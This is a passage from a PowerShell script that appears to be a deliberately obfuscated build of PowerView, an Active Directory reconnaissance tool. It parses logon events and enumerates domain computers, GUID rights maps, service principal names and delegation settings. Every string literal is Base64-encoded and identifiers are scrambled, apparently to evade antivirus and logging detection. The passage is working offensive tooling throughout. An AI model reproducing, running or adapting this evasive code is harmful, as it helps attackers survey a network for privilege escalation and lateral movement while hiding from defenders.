                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${/===\______/\/==\}
                        }
                    }
                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                            ${/===\______/\/==\} = New-Object PSObject -Property @{
                                ComputerName              = ${/\_______/\/\/=\/}
                                TimeCreated       = ${/==\_____/==\____}.TimeCreated
                                EventId           = ${/==\_____/==\____}.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdABpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${/===\______/\/==\}
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $(${/==\_____/==\____}.Id)"
                    }
                }
            }
        }
    }
}
function __/\/=\/\_/==\_/=\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${___/\_/=\_____/\_} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${___/\_/=\_/====\/} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/\_/=\_/====\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        ${/==\/\__/=\__/==\} = (___________/=\/\__ @___/\_/=\_/====\/).schema.name
    }
    catch {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    if (-not ${/==\/\__/=\__/==\}) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    ${_/\/\/\/\___/\/\/} = @{
        'SearchBase' = ${/==\/\__/=\__/==\}
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${/==\_/\/\/===\___} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    if (${/==\_/\/\/===\___}) {
        try {
            ${_/\__/\/=====\_/\} = ${/==\_/\/\/===\___}.FindAll()
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                ${___/\_/=\_____/\_}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${/==\_/\/\/===\___}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = ${/==\/\__/=\__/==\}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
    ${/==\/\/=\__/==\/=} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    if (${/==\/\/=\__/==\/=}) {
        try {
            ${_/\__/\/=====\_/\} = ${/==\/\/=\__/==\/=}.FindAll()
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                ${___/\_/=\_____/\_}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${/==\/\/=\__/==\/=}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${___/\_/=\_____/\_}
}
function __/\/\/=\/\_/==\/\ {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,
        [Switch]
        ${__/==\/=\__/==\/==},
        [Switch]
        ${___/\/=\/\/\/\____},
        [Switch]
        ${_____/=\_/=\/\/=\/},
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${__/===\______/=\/\},
        [ValidateNotNullOrEmpty()]
        [String]
        ${__/===\/==\_/=\/\_},
        [ValidateNotNullOrEmpty()]
        [String]
        ${__/==========\_/=\},
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [Switch]
        ${___/\__/\_/==\__/\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${_/=\_/===\_/=\/==} = [Enum]::GetNames(${/=\____/\/===\/\_})
        ${_/=\_/===\_/=\/==} = ${_/=\_/===\_/=\/==} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/===\_/\/\/\/==\_ -Name UACFilter -ValidateSet ${_/=\_/===\_/=\/==} -__/==\/\/=\__/=\__ ([array])
    }
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_________/\/==\__} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/===\_/\/\/\/==\_ -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${_________/\/==\__}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                }
                elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${_________/\/==\__} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${_________/\/==\__}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwA=')))
                        }
                    }
                }
                elseif (${/\______/===\__/\}.Contains('.')) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAbgBhAG0AZQA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApACgAZABuAHMAaABvAHMAdABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKQA=')))
                }
                elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                }
                else {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkA')))
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAGEAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAHsAXwBfAC8APQA9AD0AXABfAF8AXwBfAF8AXwAvAD0AXAAvAFwAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAHsAXwBfAC8APQA9AD0AXABfAF8AXwBfAF8AXwAvAD0AXAAvAFwAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG8AcABlAHIAYQB0AGkAbgBnACAAcwB5AHMAdABlAG0AOgAgACQAewBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwAvAD0AXAAvAFwAXwB9AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQAewBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwAvAD0AXAAvAFwAXwB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIABwAGEAYwBrADoAIAAkAHsAXwBfAC8APQA9AD0APQA9AD0APQA9AD0APQBcAF8ALwA9AFwAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAHsAXwBfAC8APQA9AD0APQA9AD0APQA9AD0APQBcAF8ALwA9AFwAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAaQB0AGUAIABuAGEAbQBlADoAIAAkAFMAaQB0AGUATgBhAG0AZQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATgBhAG0AZQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${_____/====\_/\__/} = $_.Substring(4)
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::${_____/====\_/\__/})
